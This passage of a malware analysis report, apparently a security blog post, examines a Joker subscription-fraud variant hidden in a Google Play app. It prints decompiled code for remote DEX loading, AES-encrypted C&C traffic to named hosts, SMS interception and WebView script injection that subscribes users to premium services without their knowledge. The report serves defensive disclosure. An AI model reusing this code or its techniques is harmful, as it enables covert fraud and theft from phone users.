class="p">,</span> <span class="o">-</span><span class="mi">53</span><span class="p">,</span> <span class="o">-</span><span class="mi">35</span><span class="p">,</span> <span class="o">-</span><span class="mi">41</span><span class="p">,</span> <span class="o">-</span><span class="mi">85</span><span class="p">,</span> <span class="mi">120</span><span class="p">},</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="o">-</span><span class="mi">82</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="o">-</span><span class="mi">19</span><span class="p">,</span> <span class="mi">62</span><span class="p">,</span> <span class="o">-</span><span class="mi">40</span><span class="p">}),</span> <span class="n">AbstractC1835n</span><span class="p">.</span><span class="na">m226m</span><span class="p">(</span><span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="o">-</span><span class="mi">19</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="o">-</span><span class="mi">122</span><span class="p">,</span> <span class="o">-</span><span class="mi">32</span><span class="p">,</span> <span class="o">-</span><span class="mi">96</span><span class="p">,</span> <span class="o">-</span><span class="mi">48</span><span class="p">,</span> <span class="o">-</span><span class="mi">5</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="o">-</span><span class="mi">33</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="o">-</span><span class="mi">116</span><span class="p">,</span> <span class="o">-</span><span class="mi">91</span><span class="p">,</span> <span class="o">-</span><span class="mi">14</span><span class="p">,</span> <span class="o">-</span><span class="mi">41</span><span class="p">,</span> <span class="o">-</span><span class="mi">25</span><span class="p">,</span> <span class="mi">62</span><span class="p">,</span> <span class="o">-</span><span class="mi">55</span><span class="p">},</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="o">-</span><span class="mi">120</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="o">-</span><span class="mi">80</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="o">-</span><span class="mi">46</span><span class="p">,</span> <span class="o">-</span><span class="mi">75</span><span class="p">})),</span> <span class="n">requestCallback</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div>


<p><code>AbstractC0382U abstractC0382U = c0378p.f1052g;</code>: This line of code is responsible for extracting the server response using the <code>abstractC0382U.string()</code> method. The response is then passed to the <code>onSuccess()</code> method, which triggers a Toast message with an encrypted string. The string from the server response is also passed to the <code>BeautySoft.open((String) entitytype);</code> function, which is a native function:</p>
<div class="highlight"><pre><span></span><code><span class="kd">public</span> <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">BeautySoft</span> <span class="p">{</span>
    <span class="kd">static</span> <span class="p">{</span>
        <span class="n">System</span><span class="p">.</span><span class="na">loadLibrary</span><span class="p">(</span><span class="n">AbstractC1835n</span><span class="p">.</span><span class="na">m226m</span><span class="p">(</span><span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="mi">112</span><span class="p">,</span> <span class="o">-</span><span class="mi">50</span><span class="p">,</span> <span class="o">-</span><span class="mi">100</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="o">-</span><span class="mi">53</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">25</span><span class="p">},</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">90</span><span class="p">,</span> <span class="o">-</span><span class="mi">13</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="o">-</span><span class="mi">92</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">109</span><span class="p">}));</span>
    <span class="p">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">native</span> <span class="kt">void</span> <span class="nf">open</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>


<p>The native library (<code>libphotoset.so</code>) is loaded dynamically using the <code>System.loadLibrary()</code> function. The library name is encrypted and decrypted using the <code>AbstractC1835n.m226m()</code> method. The server response (shown in Toast) is passed to the native <code>BeautySoft.open()</code> method. Unfortunately, the current version of the APK file available on the Google Play Store does not include the native <code>libphotoset.so</code> library in the resources. This may be due to the fact that the people responsible for developing such applications in the Google store keep updating and changing their applications to reduce the risk of detection by automatic tools. Our information also shows that the previous version was distributed as an xapk, where the <code>libphotoset.so</code> library was available.  </p>
<p>However, this is not where our analysis ends. At this point, we know that the encrypted string is passed to the <code>BeautySoft.open(String str)</code> method, which probably decrypts the string and runs it dynamically as <code>DEX</code>. So we can still try to manually decrypt the string. Here the <a href="https://gchq.github.io/CyberChef/">CyberChef</a> tool proves very useful, with its help we were able to decrypt the string and get the executable <code>DEX</code> file, which contains the malicious Joker payload. The string from the response from <code>kamisatu.top/setting/scenery</code> contains two key pieces of information. The first is an unspecified string, and the second is the URL: <code>https://forga.oss-me-east-1.aliyuncs.com/Kuwan</code>. </p>
<p>Given that we do not have access to the native library implementing the <code>BeautySoft.open()</code> functions, we can assume that the application has two methods to âcreateâ the <code>DEX</code> file:
1. decrypting the string contained in the response
2. directly downloading the <code>Kuwan</code> file and decrypting it.</p>
<p>Analysis of the string showed that it was a non-standard encryption. So we took to the wallpaper the <code>Kuwan</code> file, which we managed to decrypt:</p>
<p><img alt="" src="../../../../uploads/2024/09/6.png"></p>
<h2>Technical analysis of stage two</h2>
<p>The decrypted <code>Kuwan</code> file is in fact actually the target <code>DEX</code> file, which seems to confirm the initial theory, about a native method that decrypts a string/file downloaded from an external site into a <code>DEX</code> file and then loads and executes it dynamically.</p>
<p>We classify subscription as fraud when it is done without the user's consent. In subscription fraud, the malware executes the subscription on behalf of the user in such a way that the entire process happens in the background and is unnoticeable.</p>
<p>The first important thing the malware does, even before the main steps, is to identify the subscriber's country and mobile network with MCC and MNC codes. Both codes are retrieved by the application using the <code>TelephonyManager</code> class. The API call <code>TelephonyManager.getSimOperator()</code> returns the MCC and MNC codes as a concatenated string:</p>
<div class="highlight"><pre><span></span><code><span class="kd">private</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">MdATElAc</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">TelephonyManager</span> <span class="n">telephonyManager</span> <span class="o">=</span> <span class="p">(</span><span class="n">TelephonyManager</span><span class="p">)</span> <span class="n">f33LfUtNUXX</span><span class="p">.</span><span class="na">getSystemService</span><span class="p">(</span><span class="s">&quot;phone&quot;</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">telephonyManager</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">?</span> <span class="n">telephonyManager</span><span class="p">.</span><span class="na">getSimOperator</span><span class="p">()</span> <span class="p">:</span> <span class="s">&quot;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div>


<p>Joker variants that target devices with the Android 9.0 version use the setWifiEnabled method of the WifiManager class to disable Wi-Fi. While the variant under review, uses another <a href="https://developer.android.com/reference/android/net/ConnectivityManager#requestNetwork(android.net.NetworkRequest,%20android.net.ConnectivityManager.NetworkCallback)">capability</a>, which is the <code>requestNetwork</code> function from the <code>ConnectivityManagerclass</code>.</p>
<div class="highlight"><pre><span></span><code><span class="kd">private</span> <span class="kt">void</span> <span class="nf">TXbyafmq</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="n">NetworkRequest</span><span class="p">.</span><span class="na">Builder</span> <span class="n">builder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">NetworkRequest</span><span class="p">.</span><span class="na">Builder</span><span class="p">();</span>
            <span class="n">builder</span><span class="p">.</span><span class="na">addCapability</span><span class="p">(</span><span class="mi">12</span><span class="p">);</span>
            <span class="n">builder</span><span class="p">.</span><span class="na">addTransportType</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
            <span class="n">WYOdgBxH</span><span class="p">().</span><span class="na">requestNetwork</span><span class="p">(</span><span class="n">builder</span><span class="p">.</span><span class="na">build</span><span class="p">(),</span> <span class="k">new</span> <span class="n">C0038BdnLopBC</span><span class="p">());</span><span class="c1">//public class C0038BdnLopBC extends ConnectivityManager.NetworkCallback</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="kd">private</span> <span class="n">ConnectivityManager</span> <span class="nf">WYOdgBxH</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">ConnectivityManager</span><span class="p">)</span> <span class="k">this</span><span class="p">.</span><span class="na">f75WYOdgBxH</span><span class="p">.</span><span class="na">getSystemService</span><span class="p">(</span><span class="s">&quot;connectivity&quot;</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div>


<p>The <code>NetworkCallback</code> is used to monitor the network status and retrieve the <code>networktype</code> variable, which can then be used to bind a process to a specific network via the <code>ConnectivityManager.bindProcessToNetwork</code> function. This allows the malware to use the mobile network even if there is a Wi-Fi connection.</p>
<p>Assuming the SIM provider is on the target list and the device is using a mobile connection(which we know from the previous step), then in the next step the malware will download a list of websites offering premium services and try to subscribe. What happens next depends on how the subscription process is initiated, so the malware usually contains code that can handle different subscription flows.</p>
<p>In the second stage, the application communicates with an external server to retrieve configuration(including URLs for subscription). It uses the function <code>C0055MdATElAc WYOdgBxH(Context context, boolean z)</code> to send encrypted requests, hiding the contents of the communication.</p>
<div class="highlight"><pre><span></span><code> <span class="kd">public</span> <span class="kd">static</span> <span class="n">C0055MdATElAc</span> <span class="nf">WYOdgBxH</span><span class="p">(</span><span class="n">Context</span> <span class="n">context</span><span class="p">,</span> <span class="kt">boolean</span> <span class="n">z</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">TextUtils</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">(</span><span class="n">C0021LfUtNUXX</span><span class="p">.</span><span class="na">f34MdATElAc</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">JSONObject</span> <span class="n">jSONObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JSONObject</span><span class="p">();</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="n">jSONObject</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;zubfih&quot;</span><span class="p">,</span> <span class="n">String</span><span class="p">.</span><span class="na">valueOf</span><span class="p">(</span><span class="n">C0021LfUtNUXX</span><span class="p">.</span><span class="na">f36WYOdgBxH</span><span class="p">));</span>
            <span class="n">jSONObject</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;bshwai&quot;</span><span class="p">,</span> <span class="n">C0021LfUtNUXX</span><span class="p">.</span><span class="na">BUjkrPlp</span><span class="p">);</span>
            <span class="n">jSONObject</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;eymbmw&quot;</span><span class="p">,</span> <span class="n">z</span><span class="p">);</span>
            <span class="n">jSONObject</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;rktfht&quot;</span><span class="p">,</span> <span class="n">C0021LfUtNUXX</span><span class="p">.</span><span class="na">f37fhuPPCBW</span><span class="p">);</span>
            <span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="n">WYOdgBxH</span><span class="p">(</span><span class="n">C0023WYOdgBxH</span><span class="p">.</span><span class="na">f42LfUtNUXX</span><span class="p">).</span><span class="na">toString</span><span class="p">();</span>
            <span class="n">C0006TXbyafmq</span> <span class="n">WYOdgBxH2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">C0005LfUtNUXX</span><span class="p">().</span><span class="na">WYOdgBxH</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">WYOdgBxH</span><span class="p">(</span><span class="n">jSONObject</span><span class="p">.</span><span class="na">toString</span><span class="p">(),</span> <span class="n">url</span><span class="p">));</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">C0006TXbyafmq</span><span class="p">.</span><span class="na">WYOdgBxH</span><span class="p">(</span><span class="n">WYOdgBxH2</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">return</span> <span class="k">new</span> <span class="n">C0055MdATElAc</span><span class="p">(</span><span class="k">new</span> <span class="n">JSONObject</span><span class="p">(</span><span class="n">WYOdgBxH</span><span class="p">(</span><span class="n">WYOdgBxH2</span><span class="p">.</span><span class="na">f18MdATElAc</span><span class="p">,</span> <span class="n">url</span><span class="p">)).</span><span class="na">getJSONArray</span><span class="p">(</span><span class="s">&quot;lybfta&quot;</span><span class="p">).</span><span class="na">getJSONObject</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">IOException</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">JSONException</span> <span class="n">e2</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div>


<p>The malware checks whether the operator's SIM code is supplied, creates a payload and constructs a URL from a previously received string, which we can't get, however, because we don't have access to the <code>libphotoset.so</code> native library. When the <code>open()</code> function decrypted the <code>DEX</code> file it ran the <code>init()</code> method, where the string with the URL C&amp;C was passed:</p>
<div class="highlight"><pre><span></span><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainEntry</span> <span class="p">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">init</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">,</span> <span class="n">String</span> <span class="n">str2</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">C0021LfUtNUXX</span><span class="p">.</span><span class="na">WYOdgBxH</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="n">str2</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>


<p>It then encrypts the payload and sends it to C&amp;C:</p>
<div class="highlight"><pre><span></span><code><span class="kd">private</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">WYOdgBxH</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">,</span> <span class="n">String</span> <span class="n">str2</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">C0021LfUtNUXX</span><span class="p">.</span><span class="na">CEBGtjfl</span><span class="p">.</span><span class="na">WYOdgBxH</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="n">str2</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div>


<div class="highlight"><pre><span></span><code><span class="kd">public</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">WYOdgBxH</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">,</span> <span class="n">String</span> <span class="n">str2</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">WYOdgBxH2</span> <span class="o">=</span> <span class="n">WYOdgBxH</span><span class="p">(</span><span class="n">str2</span><span class="p">);</span>
        <span class="n">SecretKeySpec</span> <span class="n">secretKeySpec</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SecretKeySpec</span><span class="p">(</span><span class="n">WYOdgBxH2</span><span class="p">,</span> <span class="s">&quot;AES&quot;</span><span class="p">);</span>
        <span class="n">IvParameterSpec</span> <span class="n">ivParameterSpec</span> <span class="o">=</span> <span class="k">new</span> <span class="n">IvParameterSpec</span><span class="p">(</span><span class="n">WYOdgBxH2</span><span class="p">);</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="n">Cipher</span> <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&quot;AES/CBC/PKCS5Padding&quot;</span><span class="p">);</span>
            <span class="n">cipher</span><span class="p">.</span><span class="na">init</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">secretKeySpec</span><span class="p">,</span> <span class="n">ivParameterSpec</span><span class="p">);</span>
            <span class="k">return</span> <span class="n">cipher</span><span class="p">.</span><span class="na">doFinal</span><span class="p">(</span><span class="n">str</span><span class="p">.</span><span class="na">getBytes</span><span class="p">(</span><span class="n">StandardCharsets</span><span class="p">.</span><span class="na">UTF_8</span><span class="p">));</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="p">(</span><span class="n">e</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div>


<div class="highlight"><pre><span></span><code><span class="kd">public</span> <span class="n">C0006TXbyafmq</span> <span class="nf">WYOdgBxH</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">bArr</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="n">InterfaceC0007WYOdgBxH</span> <span class="n">interfaceC0007WYOdgBxH</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="na">f15TXbyafmq</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">interfaceC0007WYOdgBxH</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">str</span> <span class="o">=</span> <span class="n">interfaceC0007WYOdgBxH</span><span class="p">.</span><span class="na">WYOdgBxH</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="n">HttpURLConnection</span> <span class="n">WYOdgBxH2</span> <span class="o">=</span> <span class="n">WYOdgBxH</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="s">&quot;POST&quot;</span><span class="p">);</span>
            <span class="n">WYOdgBxH2</span><span class="p">.</span><span class="na">setDoInput</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
            <span class="n">WYOdgBxH2</span><span class="p">.</span><span class="na">setDoOutput</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">bArr</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">bArr</span><span class="p">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">OutputStream</span> <span class="n">outputStream</span> <span class="o">=</span> <span class="n">WYOdgBxH2</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">();</span>
                <span class="n">outputStream</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">bArr</span><span class="p">);</span>
                <span class="n">outputStream</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span>
                <span class="n">outputStream</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="n">WYOdgBxH</span><span class="p">(</span><span class="n">WYOdgBxH2</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="n">WYOdgBxH</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="n">e</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div>


<p>The application checks whether the connection was successful:</p>
<div class="highlight"><pre><span></span><code><span class="k">if</span> <span class="p">(</span><span class="n">C0006TXbyafmq</span><span class="p">.</span><span class="na">WYOdgBxH</span><span class="p">(</span><span class="n">WYOdgBxH2</span><span class="p">))</span> <span class="p">{</span>
<span class="k">return</span> <span class="k">new</span> <span class="n">C0055MdATElAc</span><span class="p">(</span><span class="k">new</span> <span class="n">JSONObject</span><span class="p">(</span><span class="n">WYOdgBxH</span><span class="p">(</span><span class="n">WYOdgBxH2</span><span class="p">.</span><span class="na">f18MdATElAc</span><span class="p">,</span> <span class="n">url</span><span class="p">)).</span><span class="na">getJSONArray</span><span class="p">(</span><span class="s">&quot;lybfta&quot;</span><span class="p">).</span><span class="na">getJSONObject</span><span class="p">(</span><span class="mi">0</span><span class="p">));}</span>
</code></pre></div>


<p>If so, it decrypts the return data from C&amp;C and then reads and writes the data from the <code>lubfta</code> array:</p>
<div class="highlight"><pre><span></span><code><span class="kd">public</span> <span class="n">String</span> <span class="nf">WYOdgBxH</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">bArr</span><span class="p">,</span> <span class="n">String</span> <span class="n">str</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">WYOdgBxH2</span> <span class="o">=</span> <span class="n">WYOdgBxH</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
        <span class="n">SecretKeySpec</span> <span class="n">secretKeySpec</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SecretKeySpec</span><span class="p">(</span><span class="n">WYOdgBxH2</span><span class="p">,</span> <span class="s">&quot;AES&quot;</span><span class="p">);</span>
        <span class="n">IvParameterSpec</span> <span class="n">ivParameterSpec</span> <span class="o">=</span> <span class="k">new</span> <span class="n">IvParameterSpec</span><span class="p">(</span><span class="n">WYOdgBxH2</span><span class="p">);</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="n">Cipher</span> <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&quot;AES/CBC/PKCS5Padding&quot;</span><span class="p">);</span>
            <span class="n">cipher</span><span class="p">.</span><span class="na">init</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">secretKeySpec</span><span class="p">,</span> <span class="n">ivParameterSpec</span><span class="p">);</span>
            <span class="k">return</span> <span class="k">new</span> <span class="n">String</span><span class="p">(</span><span class="n">cipher</span><span class="p">.</span><span class="na">doFinal</span><span class="p">(</span><span class="n">bArr</span><span class="p">));</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="p">(</span><span class="n">e</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div>


<p>When Malware gets a list of potential subscribers, it turns on SMS interception:</p>
<div class="highlight"><pre><span></span><code><span class="kd">class</span> <span class="nc">C0042TXbyafmq</span> <span class="kd">extends</span> <span class="n">BroadcastReceiver</span> <span class="p">{</span>


        <span class="kd">final</span> <span class="n">String</span> <span class="n">f82WYOdgBxH</span><span class="p">;</span>

        <span class="n">C0042TXbyafmq</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="na">f82WYOdgBxH</span> <span class="o">=</span> <span class="n">str</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="nd">@Override</span> 
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onReceive</span><span class="p">(</span><span class="n">Context</span> <span class="n">context</span><span class="p">,</span> <span class="n">Intent</span> <span class="n">intent</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">String</span> <span class="n">stringExtra</span> <span class="o">=</span> <span class="n">intent</span><span class="p">.</span><span class="na">getStringExtra</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">f82WYOdgBxH</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">TextUtils</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">(</span><span class="n">stringExtra</span><span class="p">))</span> <span class="p">{</span>
                <span class="n">stringExtra</span> <span class="o">=</span> <span class="n">intent</span><span class="p">.</span><span class="na">getStringExtra</span><span class="p">(</span><span class="s">&quot;android.text&quot;</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">TextUtils</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">(</span><span class="n">stringExtra</span><span class="p">))</span> <span class="p">{</span>
                <span class="n">stringExtra</span> <span class="o">=</span> <span class="n">intent</span><span class="p">.</span><span class="na">getStringExtra</span><span class="p">(</span><span class="s">&quot;at&quot;</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">TextUtils</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">(</span><span class="n">stringExtra</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">Telephony</span><span class="p">.</span><span class="na">Sms</span><span class="p">.</span><span class="na">getDefaultSmsPackage</span><span class="p">(</span><span class="n">C0037TXbyafmq</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">f75WYOdgBxH</span><span class="p">).</span><span class="na">equals</span><span class="p">(</span><span class="n">intent</span><span class="p">.</span><span class="na">getStringExtra</span><span class="p">(</span><span class="s">&quot;ap&quot;</span><span class="p">)))</span> <span class="p">{</span>
                    <span class="k">return</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="n">C0022TXbyafmq</span><span class="p">.</span><span class="na">LfUtNUXX</span><span class="p">(</span><span class="s">&quot;addSmsFromBroadcast:&quot;</span> <span class="o">+</span> <span class="n">stringExtra</span><span class="p">);</span>
            <span class="n">C0037TXbyafmq</span><span class="p">.</span><span class="na">WYOdgBxH</span><span class="p">(</span><span class="n">stringExtra</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div>


<p>The application then initializes <code>webView</code>(<code>C0028LfUtNUXX</code>) with JavaScript enabled, and initiates a call to the URL of the subscription page from a previously downloaded list. In the next step, it executes JavaScript to interact with the page, which automates the whole process and allows to subscribe to a given page without user interaction:</p>
<div class="highlight"><pre><span></span><code><span class="kd">public</span> <span class="kt">void</span> <span class="nf">WYOdgBxH</span><span class="p">(</span><span class="n">C0055MdATElAc</span><span class="p">.</span><span class="na">C0056LfUtNUXX</span> <span class="n">c0056LfUtNUXX</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="na">f57TXbyafmq</span><span class="p">.</span><span class="na">f105TXbyafmq</span> <span class="o">&gt;=</span> <span class="mi">300</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">TXbyafmq</span><span class="p">(</span><span class="s">&quot;runJs-&quot;</span> <span class="o">+</span> <span class="n">c0056LfUtNUXX</span><span class="p">.</span><span class="na">f113WYOdgBxH</span> <span class="o">+</span> <span class="s">&quot;:&quot;</span> <span class="o">+</span> <span class="n">c0056LfUtNUXX</span><span class="p">.</span><span class="na">f110LfUtNUXX</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">this</span><span class="p">.</span><span class="na">f58WYOdgBxH</span><span class="p">.</span><span class="na">evaluateJavascript</span><span class="p">(</span><span class="n">c0056LfUtNUXX</span><span class="p">.</span><span class="na">f110LfUtNUXX</span><span class="p">.</span><span class="na">replace</span><span class="p">(</span><span class="n">C0023WYOdgBxH</span><span class="p">.</span><span class="na">BRgPASkR</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="na">f59fhuPPCBW</span><span class="p">),</span> <span class="kc">null</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div>


<p>JavaScript is executed in the context of the WebView, causing the call method to be called(<code>C0023WYOdgBxH.BRgPASkR == "window.JBridge.call('dump', document.documentElement.outerHTML);"</code>)</p>
<div class="highlight"><pre><span></span><code> <span class="nd">@JavascriptInterface</span>
        <span class="kd">public</span> <span class="n">String</span> <span class="nf">call</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">,</span> <span class="n">String</span> <span class="n">str2</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">try</span> <span class="p">{</span>
            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">C0028LfUtNUXX</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">TXbyafmq</span><span class="p">(</span><span class="s">&quot;JBridge-Exception:&quot;</span> <span class="o">+</span> <span class="n">e</span><span class="p">.</span><span class="na">toString</span><span class="p">());</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">C0028LfUtNUXX</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">f57TXbyafmq</span><span class="p">.</span><span class="na">eJbwVqlc</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="s">&quot;&quot;</span><span class="p">;</span>
            <span class="p">}</span>
